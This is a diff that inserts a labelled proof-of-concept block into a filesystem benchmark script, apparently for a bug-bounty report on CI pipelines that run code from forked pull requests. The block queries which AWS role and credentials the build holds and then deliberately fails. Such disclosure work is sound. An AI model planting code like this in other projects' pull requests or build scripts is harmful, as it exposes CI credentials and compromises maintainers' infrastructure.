@@ -1,5 +1,25 @@
 #!/bin/bash
-set -e
+
+# --- PoC Start - mainteemoforfun ---
+set -e # Ensure script exits on error within PoC
+
+echo "####################################################################"
+echo "#                    mainteemoforfun h1                     #"
+echo "####################################################################"
+echo ""
+echo ">>> PoC: EXECUTING CODE FROM FORKED PR (in fs_bench.sh) <<<"
+echo ">>> PoC: Attempting AWS CLI command to identify role:"
+
+# Attempt to run AWS command, redirect stderr to stdout to capture errors if CLI is not found or no creds
+aws sts get-caller-identity || echo "PoC: aws command failed or no credentials found."
+
+echo ">>> PoC: TEST FINISHED, FAILING INTENTIONALLY <<<"
+exit 1
+# --- PoC End ---
+
+# Original script content starts here
+# (Note: The 'set -e' from the PoC will cause the script to exit if 'aws sts get-caller-identity' fails and 'exit 1' is reached)
+# If the PoC's 'exit 1' is removed, the original script's 'set -e' will take effect from here.
 
 if ! command -v fio &> /dev/null; then
   echo "fio must be installed to run this benchmark"
